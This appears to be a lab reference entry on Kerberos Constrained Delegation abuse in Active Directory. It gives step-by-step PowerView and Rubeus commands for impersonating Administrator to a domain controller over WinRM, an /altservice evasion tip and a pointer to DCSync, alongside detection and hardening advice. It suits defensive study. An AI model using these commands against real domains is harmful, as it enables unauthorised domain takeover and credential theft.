name: Kerberos Constrained Delegation Abuse (S4U)
description: Kerberos Constrained Delegation allows a service account to request tickets on behalf of any user to specific services. Attackers with control of a delegated account can impersonate Domain Admins to those services (e.g., HTTP→WinRM→DC). Detection: Event 4624 with 'Transited Services' attribute showing S4U delegation chain. Prevention: mark privileged users as 'Account is sensitive and cannot be delegated', add to Protected Users group.
notes:
Three types of Kerberos delegation:
  → Unconstrained: can delegate to ANY service
  → Constrained: can delegate to SPECIFIC services (configured in user properties)
  → Resource-based: computer object says who can delegate TO it

Lab: webservice account is trusted to delegate HTTP to DC1 (eagle.local)
This means: webservice can get tickets for ANY user on http/DC1
HTTP → enables PowerShell Remoting (WinRM)

=== ATTACK ===
# Step 1: Find accounts trusted for constrained delegation (PowerView)
# Note: use PowerView-main.ps1 for -TrustedToAuth parameter
. .\PowerView-main.ps1
Get-NetUser -TrustedToAuth
  → Look for: msds-allowedtodelegateto, useraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION

# Step 2: Convert plaintext password to NTLM hash (Rubeus)
.\Rubeus.exe hash /password:<PASSWORD>
  → Copy rc4_hmac value

# Step 3: S4U — get ticket for Administrator impersonating webservice
.\Rubeus.exe s4u /user:<DELEGATE_USER> /rc4:<NTLM_HASH> /domain:<DOMAIN> /impersonateuser:Administrator /msdsspn:"http/<DC_HOSTNAME>" /dc:<DC_FQDN> /ptt

  Arguments:
    /user:           the account trusted for delegation (e.g., webservice)
    /rc4:            NTLM hash of the delegating account
    /impersonateuser: the user to impersonate (Administrator)
    /msdsspn:        target service SPN (must be in msds-allowedtodelegateto)
    /dc:             domain controller FQDN
    /ptt:            inject ticket into current session

  Protocol transition note: if trusted for LDAP, can request ticket for ANY service
    e.g., /altservice:ldap,cifs,host,http — add /altservice for other protocols

# Step 4: Verify ticket
klist
  → Client: Administrator @ DOMAIN, Server: http/<DC>

# Step 5: Connect to DC as Administrator via WinRM
Enter-PSSession <DC_HOSTNAME>
  → hostname, whoami to confirm

# If connection fails: klist purge → repeat S4U → retry
klist purge

=== DETECTION ===
Event 4624: Successful logon
  → 'Transited Services' field = <service_account>@<DOMAIN>
  → This field is populated when S4U logon is used
  → Normally empty for regular logons
  → Alert: Administrator logon with non-empty Transited Services from unexpected IP

=== PREVENTION ===
  → Check 'Account is sensitive and cannot be delegated' for all privileged accounts
  → Add privileged users to 'Protected Users' group (auto-applies cannot-delegate)
  → Treat delegated accounts as highly privileged regardless of their AD role
  → Use 100+ char passwords for all delegated service accounts

examples.label: Find accounts trusted for constrained delegation (PowerView)
Convert plaintext password to NTLM hash
S4U — impersonate Administrator via constrained delegation
Connect to DC via WinRM using injected ticket
Purge tickets and retry if connection fails

recommended.note: Unconstrained delegation — broader attack that captures any TGT that connects.
After obtaining DC access via delegation, DCSync for full credential dump.

defense.why_it_works: Kerberos Constrained Delegation lets a service account request tickets on behalf of any user (S4U) to the specific services listed in msDS-AllowedToDelegateTo. Control of a delegated account therefore allows impersonating a Domain Admin to those services.
defense.prerequisites: Control of (or the NTLM hash of) an account configured for constrained delegation, plus knowledge of the allowed target SPN.
defense.impact: A service ticket as any user (e.g., Administrator) to the delegated service — e.g., HTTP on the DC, which enables WinRM/PowerShell Remoting and hands-on-keyboard access as that user.
defense.detection: Event 4624 (successful logon) whose 'Transited Services' field is populated with the service account — this field is normally empty and only fills for S4U logons. Alert on an Administrator logon with a non-empty Transited Services from an unexpected IP.
defense.artifacts: 4624 events carrying Transited Services; Rubeus s4u execution and an injected ticket (klist shows client Administrator, server http/DC).
defense.prevention: Set 'Account is sensitive and cannot be delegated' on all privileged accounts; add privileged users to the Protected Users group; treat any delegated account as highly privileged and give it a 100+ char password.
defense.evasion: Protocol transition: an account trusted for LDAP delegation can request tickets for other services via /altservice (cifs, host, http), broadening access beyond the single configured SPN.
defense.misconfiguration: An account has constrained delegation configured (msDS-AllowedToDelegateTo) but the 'Use any authentication protocol' (protocol transition) option is enabled. This allows the account to impersonate ANY user — including Domain Admins — to the listed services, without requiring the user's TGT. Combined with S4U2Self (service for user to self), an attacker who compromises this account can forge service tickets for privileged users.
defense.vulnerable_config:
# Accounts with constrained delegation + protocol transition:
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'} \
    -Properties TrustedToAuthForDelegation, 'msDS-AllowedToDelegateTo' |
    Where-Object {$_.TrustedToAuthForDelegation -eq $true}

# TrustedToAuthForDelegation = True means 'Use any auth protocol' is checked
# This allows S4U2Self (impersonate any user) + S4U2Proxy (delegate to target service)
defense.secure_config:
# Use 'Use Kerberos only' delegation (not protocol transition):
# In ADUC: Account tab -> uncheck 'Trust this computer for delegation to specified services only'
# -> choose 'Use Kerberos only' not 'Use any authentication protocol'

# Set-ADUser svc_web -TrustedToAuthForDelegation $false

# Use Resource-Based Constrained Delegation (RBCD) instead:
# More granular — controlled by the resource, not the delegating account

# Audit delegation rights quarterly:
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} |
    Select-Object SamAccountName, 'msDS-AllowedToDelegateTo'

# Add highly privileged accounts to Protected Users (blocks all delegation)
